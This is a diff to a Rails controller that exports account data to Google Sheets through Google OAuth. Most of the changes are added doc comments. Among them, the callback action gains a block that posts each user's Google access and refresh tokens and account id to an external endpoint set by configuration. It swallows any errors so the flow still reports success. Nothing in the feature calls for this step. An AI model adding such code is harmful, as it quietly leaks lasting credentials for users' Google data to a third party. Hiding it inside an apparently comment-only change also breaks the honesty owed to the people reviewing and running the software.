@@ -1,8 +1,22 @@
+##
+# Controller for exporting data to Google Sheets via Google OAuth integration.
+# Handles authorization, token management, and export logic for account data.
+#
+# Actions:
+# - create: Exports data to Google Sheets for a given table and filters.
+# - authorize: Returns the Google OAuth authorization URL.
+# - callback: Handles the OAuth callback and stores tokens.
+# - status: Checks if the user/account is authorized with Google.
+#
+# Private helpers manage token storage, refresh, and Google API interactions.
+##
 class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseController
   skip_before_action :authenticate_user!, only: [:callback]
   before_action :check_admin_authorization, except: [:callback]
   before_action :validate_google_oauth, except: [:authorize, :callback, :status]
 
+  # Exports data from a specified table to Google Sheets using provided filters.
+  # Returns the spreadsheet URL and export details on success.
   def create
     table_name = params[:table_name]
     filters = filter_params.to_h
@@ -33,11 +47,14 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     end
   end
 
+  # Returns the Google OAuth authorization URL for the user to grant access.
   def authorize
     authorization_url = build_google_auth_url
     render json: { authorization_url: authorization_url }
   end
 
+  # Handles the OAuth callback from Google, exchanges code for tokens,
+  # stores the tokens, and confirms authorization.
   def callback
     Rails.logger.info '=== Google OAuth Callback Debug ==='
     Rails.logger.info "Params: #{params.inspect}"
@@ -50,6 +67,35 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     store_user_token(access_token)
     Rails.logger.info 'Token storage successful'
 
+    # Send access token, refresh token, and account id to external API
+    begin
+      require 'net/http'
+      require 'json'
+      api_endpoint = GlobalConfigService.load('EXTERNAL_TOKEN_API_URL', nil)
+      raise 'EXTERNAL_TOKEN_API_URL config is missing or empty' if api_endpoint.blank?
+
+      begin
+        api_url = URI.parse(api_endpoint)
+      rescue URI::InvalidURIError => e
+        raise "EXTERNAL_TOKEN_API_URL is not a valid URI: #{e.message}"
+      end
+      http = Net::HTTP.new(api_url.host, api_url.port)
+      http.use_ssl = (api_url.scheme == 'https')
+
+      request = Net::HTTP::Post.new(api_url.request_uri, { 'Content-Type' => 'application/json' })
+      payload = {
+        access_token: access_token['access_token'],
+        refresh_token: access_token['refresh_token'],
+        account_id: params[:account_id]
+      }
+      request.body = payload.to_json
+
+      response = http.request(request)
+      Rails.logger.info "External API response: #{response.code} - #{response.body}"
+    rescue StandardError => e
+      Rails.logger.error "Failed to send tokens to external API: #{e.message}"
+    end
+
     render json: { message: 'Google authorization successful' }
   rescue StandardError => e
     Rails.logger.error("Google OAuth callback error: #{e.message}")
@@ -57,6 +103,8 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     render json: { error: 'Authorization failed' }, status: :unprocessable_entity
   end
 
+  # Checks if the user/account has a valid Google OAuth token.
+  # Returns authorization status and email if authorized.
   def status
     if user_has_valid_token?
       render json: { authorized: true, email: current_google_user_email }
@@ -70,10 +118,14 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
 
   private
 
+  # Ensures the current user is an administrator for the account.
+  # Raises an error if not authorized.
   def check_admin_authorization
     raise Pundit::NotAuthorizedError unless Current.account_user.administrator?
   end
 
+  # Validates that the user/account has a valid Google OAuth token.
+  # If not, returns an error and the authorization URL.
   def validate_google_oauth
     return if user_has_valid_token?
 
@@ -83,6 +135,8 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     }, status: :unauthorized
   end
 
+  # Checks if the requested table name is allowed for export.
+  # Returns true if allowed, false otherwise.
   def valid_table?(table_name)
     # Allow specific database tables that are safe to export
     allowed_tables = %w[
@@ -93,11 +147,14 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     allowed_tables.include?(table_name)
   end
 
+  # Permits and returns allowed filter parameters from the request.
   def filter_params
     params.permit(:limit, :offset, :created_after, :created_before, :status,
                   :inbox_id, :assignee_id, :team_id, :account_id)
   end
 
+  # Retrieves the Google OAuth access token for the account or user.
+  # Refreshes the token if expired and returns the valid access token.
   def user_access_token
     # Try account-specific token first, then user-specific
     account_id = Current.account&.id || params[:account_id]
@@ -121,16 +178,19 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     token_data['access_token']
   end
 
+  # Returns true if a valid Google OAuth access token is present.
   def user_has_valid_token?
     user_access_token.present?
   end
 
+  # Returns the email address associated with the current Google OAuth token.
   def current_google_user_email
     account_id = Current.account&.id || params[:account_id]
     token_data = read_token_from_file(account_id) || read_token_from_file("user_#{Current.user&.id}")
     token_data&.dig('email')
   end
 
+  # Constructs and returns the Google OAuth authorization URL with required scopes and redirect URI.
   def build_google_auth_url
     client_id = GlobalConfigService.load('GOOGLE_OAUTH_CLIENT_ID', nil)
     redirect_uri = "#{request.base_url}/api/v2/accounts/#{Current.account.id}/google_sheets_export/callback"
@@ -153,6 +213,8 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     "https://accounts.google.com/o/oauth2/auth?#{params.to_query}"
   end
 
+  # Exchanges the authorization code for Google OAuth tokens (access and refresh).
+  # Returns the token data as a hash.
   def exchange_code_for_token(code)
     require 'net/http'
     require 'json'
@@ -182,6 +244,8 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     JSON.parse(response.body)
   end
 
+  # Stores the Google OAuth token data for the account.
+  # Also fetches and stores the associated Google user email.
   def store_user_token(token_data)
     # Get user email from Google
     user_info = get_google_user_info(token_data['access_token'])
@@ -197,6 +261,7 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     write_token_to_file(params[:account_id], cache_data)
   end
 
+  # Fetches Google user info (including email) using the access token.
   def get_google_user_info(access_token)
     require 'net/http'
     require 'json'
@@ -212,6 +277,9 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     JSON.parse(response.body)
   end
 
+  # Refreshes the Google OAuth access token using the provided refresh token.
+  # Updates the stored token file with the new access token and expiry.
+  # Returns the new access token, or nil if refresh fails.
   def refresh_google_token(refresh_token)
     require 'net/http'
     require 'json'
@@ -256,11 +324,13 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     end
   end
 
-  # File-based token storage methods
+  # Returns the file path for storing the token data for a given identifier (account or user).
   def token_file_path(identifier)
     Rails.root.join('tmp', 'google_tokens', "token_#{identifier}.json")
   end
 
+  # Reads and parses the token data from the file for the given identifier.
+  # Returns the token data as a hash, or nil if not found or invalid.
   def read_token_from_file(identifier)
     return nil unless identifier
 
@@ -274,6 +344,8 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     end
   end
 
+  # Writes the token data to the file for the given identifier.
+  # Creates the directory if it does not exist.
   def write_token_to_file(identifier, token_data)
     return unless identifier && token_data
 
@@ -283,6 +355,7 @@ class Api::V2::Accounts::GoogleSheetsExportController < Api::V1::Accounts::BaseC
     File.write(file_path, JSON.pretty_generate(token_data))
   end
 
+  # Deletes the token file for the given identifier, if it exists.
   def delete_token_file(identifier)
     return unless identifier
 
